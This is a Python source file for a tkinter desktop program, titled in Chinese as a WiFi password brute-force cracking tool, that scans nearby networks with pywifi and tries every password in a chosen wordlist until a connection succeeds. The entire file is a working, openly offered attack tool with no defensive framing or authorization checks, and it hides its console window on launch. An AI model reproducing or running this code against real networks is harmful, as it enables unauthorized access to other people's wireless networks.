# -*- coding: utf-8 -*-
"""
@author:白恒aead
@file: ${NAME}.py
@time:$DATE
"""
from cgitb import text
from concurrent.futures import thread
from ctypes.wintypes import SC_HANDLE
from math import fabs
from struct import pack
import sys
import io
from venv import create
from numpy import insert
sys.stdout=io.TextIOWrapper(sys.stdout.buffer,encoding='utf8')

import pywifi
import time
from pywifi import const

import os
import threading
import tkinter as tk
import tkinter.ttk as ttk
from tkinter import CENTER, LEFT, messagebox as msg  #消息框
from tkinter import filedialog as openfile  #打开文件夹
import ctypes
# from wifiCrackIcon import img   # 图标
# import base64,os

# 隐藏控制台窗口
whnd = ctypes.windll.kernel32.GetConsoleWindow()
if whnd != 0:
    ctypes.windll.user32.ShowWindow(whnd, 0)
    ctypes.windll.kernel32.CloseHandle(whnd)

# 告诉操作系统使用程序自身的dpi适配
ctypes.windll.shcore.SetProcessDpiAwareness(1)
# 获取屏幕的缩放因子
ScaleFactor=ctypes.windll.shcore.GetScaleFactorForDevice(0)


# 初始化窗口
win = tk.Tk()
win.title('Wifi密码暴力破解工具 @白恒aead')
win.lift()

# 设置窗口大小并且居中显示
# 屏幕宽度以及屏幕高度
screenwidth = win.winfo_screenwidth()
screenheight = win.winfo_screenheight()
dialog_width = 600
dialog_height = 600
# 前两个参数是窗口的大小，后面两个参数是窗口的位置
win.geometry("%dx%d+%d+%d" % (dialog_width, dialog_height, (screenwidth-dialog_width)/2, (screenheight-dialog_height)/2))

# 禁止调整窗口大小
win.resizable(False,False)

# # 设置打包图标
# tmp = open("tmp.ico","wb+")  
# tmp.write(base64.b64decode(img))#写入到临时文件中
# tmp.close()
# win.iconbitmap("tmp.ico") #设置图标
# os.remove("tmp.ico")      #删除临死图标

# 用来包裹frame的容器
frame = tk.Frame()
frame.pack(padx=1,pady=(10,0))
frame_type = tk.Frame()
frame_type.pack(padx=1,pady=(10,0))
frame_file = tk.Frame()
frame_file.pack(padx=1,pady=(5,0))
frame_btn = tk.Frame()
frame_btn.pack(padx=1,pady=(5,0))

# 提示输入wifi名称的标签
lbl_wifiName = ttk.Label(frame,text="Wifi名称:")
lbl_wifiName.pack(side=tk.LEFT)

# wifi名称选中框
sel_wifiName = ttk.Combobox(frame,width=23)
sel_wifiName.pack()
sel_wifiName['state'] = 'disabled'

# 提示输入加密类型的标签
lbl_wifiType = ttk.Label(frame_type,text="安全类型:")
lbl_wifiType.pack(side=tk.LEFT)

# 加密类型选中框
sel_wifiType = ttk.Combobox(frame_type,width=23)
sel_wifiType.pack()
sel_wifiType['value'] = ['WPA','WPAPSK','WPA2','WPA2PSK','UNKNOWN']
sel_wifiType.current(3)

file_path = 'passwords.txt'
filepaths = file_path.split('/')
filename = filepaths[len(filepaths)-1]
# 显示正在使用的密码本
lbl_pwdstitle = ttk.Label(frame_file,text='正在使用密码本:')
lbl_pwdstitle.pack(side=tk.LEFT)
lbl_pwds = ttk.Label(frame_file,text=filename)
lbl_pwds.pack()

# 选择密码本
def change():
    '''选择密码本'''

    try:
        default_dir = r"."
        global file_path
        global filepaths
        global filename
        temp_file_path = openfile.askopenfilename(title=u'选择密码本', initialdir=(os.path.expanduser(default_dir)))
        temp_filepaths = temp_file_path.split('/')
        temp_filename = temp_filepaths[len(temp_filepaths)-1]
        temp_filenames = temp_filename.split('.')
        temp_filetype = temp_filenames[len(temp_filenames)-1]
        if(temp_filetype==''):
            msg.showinfo(title='提示',message='未选择密码本')
            return False
        elif(temp_filetype!='txt'):
            msg.showerror(title='选择密码本',message='密码本类型错误！\n目前仅支持格式为[txt]的密码本\n您选择的密码本格式为['+temp_filetype+']')
            return False
        else:
            file_path = temp_file_path
            filepaths = temp_filepaths
            filename = temp_filename
            lbl_pwds['text'] = filename
            return True
    except Exception as r:
        msg.showerror(title='错误警告',message='选择密码本时发生未知错误 %s' %(r))

# 创建选择密码本路径的按钮
btn_file = ttk.Button(frame_btn,text='更换密码本',width=10,command=change)
btn_file.pack(side=tk.LEFT)

# 创建滚动条
msg_scroll = ttk.Scrollbar()
# 创建文本框用于展示提示信息
msg_info = tk.Text(win, width=65)
# 将滚动条和文本框绑定在一起
msg_scroll.config(command=msg_info.yview)
msg_info.config(yscrollcommand=msg_scroll.set)

#设置程序缩放
win.tk.call('tk', 'scaling', ScaleFactor/75)

# 用于输出消息
def msgshow(msg):
    '''输出显示消息'''

    msg_info['state'] = 'normal'
    msg_info.insert(tk.END,msg)
    msg_info.see(tk.END)
    msg_info['state'] = 'disabled'

# 用于清空消息
def msgempty():
    '''清空输出消息'''

    msg_info['state'] = 'normal'
    msg_info.delete(1.0,tk.END)
    msg_info['state'] = 'disabled'

# 重置所有按钮状态
def btnreset():
    '''重置按钮'''
    
    sel_wifiName['state'] = 'normal'
    sel_wifiType['state'] = 'normal'
    btn_Reflush['state'] = 'normal'
    btn_file['state'] = 'normal'
    btn_run['state'] = 'normal'
    btn_stop['state'] = 'disabled'

# 判断字符串是否包含中文
def is_contains_chinese(strs):
    for _char in strs:
        if '\u4e00' <= _char <= '\u9fa5':
            return True
    return False

run = True
# 暴力破解wifi密码的类
class Crack():
    '''用于暴力破解wifi的类'''

    def initCrack(self):
        """初始化暴力破解"""

        try:
            msgempty()
            wifi = pywifi.PyWiFi()  # 抓取网卡接口
            self.iface = wifi.interfaces()[0]# 获取网卡
            thread = threading.Thread(target=self.Search_WiFi,args=())# 获取附近wifi名称
            thread.setDaemon(True)
            thread.start()
        except Exception as r:
            msg.showerror(title='错误警告',message='初始化时发生未知错误 %s' %(r))
            msgshow('初始化时发生未知错误 %s\n\n' %(r))
            btnreset()

    def Search_WiFi(self):
        """扫描附近wifi => wifi名称数组"""
        
        try:
            sel_wifiName['value'] = []
            btn_Reflush['state'] = 'disabled'
            name = self.iface.name()#网卡名称
            self.iface.scan()#扫描AP
            msgshow('正在使用网卡['+name+']扫描WiFi...\n')
            time.sleep(1)
            bessis = self.iface.scan_results()#扫描结果列表
            msgshow('已扫描到WiFi\n\n')
            ssids = []
            i = 0
            for data in bessis:#输出扫描到的WiFi名称
                # ssids.insert(i,data.ssid.encode('raw_unicode_escape').decode('utf-8'))
                ssids.insert(i,data.ssid)
                i+=1
                
            btn_Reflush['state'] = 'normal'
            btn_run['state'] = 'normal'
            sel_wifiName['state'] = 'normal'
            sel_wifiName['value'] = ssids
            sel_wifiName.current(0)
        except Exception as r:
            msg.showerror(title='错误警告',message='扫描wifi时发生未知错误 %s' %(r))
            msgshow('扫描wifi时发生未知错误 %s\n\n' %(r))
            btnreset()

    def Connect(self,name):
        '''开始破解wifi'''

        try:
            global run
            global file_path
            x = 1
            self.iface.disconnect()  # 断开所有连接
            msgshow('正在断开现有连接...\n')
            time.sleep(1)
            if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:  # 测试是否已经断开网卡连接
                msgshow('现有连接断开成功！\n')
            else:
                msgshow('现有连接断开失败！\n')
                return
            msgshow('\n正在准备破解WiFi[%s]...\n\n'%(name))
            with open(file_path,'r', encoding='gb18030', errors='ignore') as lines:
                for line in lines:
                    if run==False:
                        msgshow('破解已终止.\n')
                        return
                    pwd = line.strip()
                    # 判断安全加密类型
                    akm = sel_wifiType.get()
                    akm_v = 4
                    if akm=='WPA':
                        akm_v = 1
                    elif akm=='WPAPSK':
                        akm_v = 2
                    elif akm=='WPA2':
                        akm_v = 3
                    elif akm=='WPA2PSK':
                        akm_v = 4
                    elif akm=='UNKNOWN':
                        akm_v = 5
                    profile = pywifi.Profile()  #创建wifi配置对象
                    # 判断wifi名称是否包含中文字符
                    if is_contains_chinese(name):
                        profile.ssid = name.encode('utf-8').decode('gbk')   # 对wifi名称进行utf-8解码
                    else:
                        profile.ssid = name.encode('raw_unicode_escape').decode('gbk')    # 对wifi名称进行unicode解码
                    profile.key = pwd   #WiFi密码
                    profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
                    profile.akm.append(akm_v)  #wifi加密算法，一般是 WPA2PSK
                    profile.cipher = const.CIPHER_TYPE_CCMP #加密单元
                    self.iface.remove_network_profile(profile)  #删除wifi文件
                    tem_profile = self.iface.add_network_profile(profile)   #添加新的WiFi文件
                    msgshow('正在进行第%d次尝试...\n'%(x))
                    x += 1
                    self.iface.connect(tem_profile)#连接
                    time.sleep(1)   #连接需要时间
                    if self.iface.status() == const.IFACE_CONNECTED:    #判断是否连接成功
                        msgshow("连接成功，密码是%s\n\n"%(pwd))
                        msg_info['fg'] = 'green'
                        sel_wifiName['state'] = 'normal'
                        sel_wifiType['state'] = 'normal'
                        btn_Reflush['state'] = 'normal'
                        btn_file['state'] = 'normal'
                        btn_run['state'] = 'normal'
                        btn_stop['state'] = 'disabled'
                        msg.showinfo(title='破解成功',message="连接成功，密码是%s"%(pwd))
                        return
                    else:
                        msgshow("连接失败，密码是%s\n\n"%(pwd))
                        msg_info['fg'] = 'red'
                msg.showinfo(title='破解失败',message="破解失败，已尝试完密码本中所有可能的密码")
                sel_wifiName['state'] = 'normal'
                sel_wifiType['state'] = 'normal'
                btn_Reflush['state'] = 'normal'
                btn_file['state'] = 'normal'
                btn_run['state'] = 'normal'
                btn_stop['state'] = 'disabled'
        except Exception as r:
            msg.showerror(title='错误警告',message='破解过程中发生未知错误 %s' %(r))
            msgshow('破解过程中发生未知错误 %s\n\n' %(r))
            btnreset()

# 创建破解对象
crack = Crack()
thread = threading.Thread(target=crack.initCrack,args=())
thread.setDaemon(True)
thread.start()

# 刷新按钮
btn_Reflush = ttk.Button(frame_btn,text='刷新wifi',width=10)
# 开始按钮
btn_run = ttk.Button(frame_btn,text='开始',width=10)
# 停止按钮
btn_stop = ttk.Button(frame_btn,text='停止',width=10)

# 刷新wifi列表
def Reflush():
    try:
        global crack
        thread = threading.Thread(target=crack.Search_WiFi(),args=())
        thread.setDaemon(True)
        thread.start()
        msg_info['fg'] = 'black'
    except Exception as r:
        msg.showerror(title='错误警告',message='刷新wifi时发生未知错误 %s' %(r))
        msgshow('刷新wifi时发生未知错误 %s\n\n' %(r))
        btnreset()

# 开始暴力破解
def GetPwdRun():
    try:
        wifiName = sel_wifiName.get()
        global crack
        global run
        run = True
        sel_wifiName['state'] = 'disabled'
        sel_wifiType['state'] = 'disabled'
        btn_Reflush['state'] = 'disabled'
        btn_file['state'] = 'disabled'
        btn_run['state'] = 'disabled'
        btn_stop['state'] = 'normal'
        thread = threading.Thread(target=crack.Connect,args=(wifiName,))
        thread.setDaemon(True)
        thread.start()
        msg_info['fg'] = 'black'
    except Exception as r:
        msg.showerror(title='错误警告',message='运行时发生未知错误 %s' %(r))
        msgshow('运行时发生未知错误 %s\n\n' %(r))
        btnreset()

# 终止暴力破解
def Stop():
    try:
        global run
        run = False
        sel_wifiName['state'] = 'normal'
        sel_wifiType['state'] = 'normal'
        btn_Reflush['state'] = 'normal'
        btn_file['state'] = 'normal'
        btn_run['state'] = 'normal'
        btn_stop['state'] = 'disabled'
        msg_info['fg'] = 'black'
    except Exception as r:
        msg.showerror(title='错误警告',message='停止时发生未知错误 %s' %(r))
        msgshow('停止时发生未知错误 %s\n\n' %(r))
        btnreset()

btn_Reflush['command'] = Reflush
btn_Reflush['state'] = 'disabled'
btn_Reflush.pack(side=tk.LEFT)

btn_run['command'] = GetPwdRun
btn_run['state'] = 'disabled'
btn_run.pack(side=tk.LEFT)

btn_stop['command'] = Stop
btn_stop['state'] = 'disabled'
btn_stop.pack(side=tk.RIGHT)

# 设置消息框和滚动条的显示位置
msg_scroll.pack(side=tk.RIGHT,pady=10, fill=tk.Y)
msg_info.pack(side=tk.LEFT,pady=10, fill=tk.Y)

# 判断默认密码本是否存在
if not os.path.exists(file_path):
    msg.showwarning(title='警告',message='默认密码本[%s]不存在！\n请选择密码本'%(file_path))
    while(True):
        if(change()):
            crack = Crack()
            thread = threading.Thread(target=crack.initCrack,args=())
            thread.start()
            break

win.mainloop()
